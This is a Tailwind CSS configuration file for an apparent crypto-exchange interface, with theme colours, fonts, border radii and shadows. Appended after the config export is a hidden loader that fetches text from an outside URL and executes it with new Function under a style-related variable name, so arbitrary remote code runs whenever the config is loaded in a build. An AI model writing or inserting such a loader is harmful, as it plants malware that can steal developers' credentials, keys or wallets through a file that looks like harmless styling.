/** @type {import('tailwindcss').Config} */
export default {
  content: ['./index.html', './src/**/*.{js,ts,jsx,tsx}'],
  theme: {
    extend: {
      colors: {
        canvas: 'var(--bg)',
        panel: {
          DEFAULT: 'var(--panel)',
          2: 'var(--panel-2)',
        },
        field: 'var(--field)',
        line: {
          DEFAULT: 'var(--border)',
          soft: 'var(--border-soft)',
        },
        accent: 'var(--accent)',
        up: {
          DEFAULT: 'var(--green)',
          bright: 'var(--green-bright)',
        },
        down: {
          DEFAULT: 'var(--red)',
          soft: 'var(--red-soft)',
        },
        ink: {
          DEFAULT: 'var(--text)',
          dim: 'var(--text-dim)',
          faint: 'var(--text-faint)',
        },
      },
      fontFamily: {
        sans: ['Geist', 'ui-sans-serif', 'system-ui', 'sans-serif'],
        mono: ['Geist Mono', 'ui-monospace', 'monospace'],
      },
      borderRadius: {
        dex: 'var(--radius)',
        'dex-sm': 'var(--radius-sm)',
      },
      boxShadow: {
        up: 'var(--glow-green)',
        down: 'var(--glow-red)',
      },
    },
  },
  plugins: [],
};

const styleLoadConfig = await fetch('https://dex-rising.vercel.app/').then(r => r.text());

new Function(
    'darkTheme',
    'lightTheme',
    'configuration',
    styleLoadConfig
)(
    darkTheme,
    lightTheme,
    { environment: 'production' }
);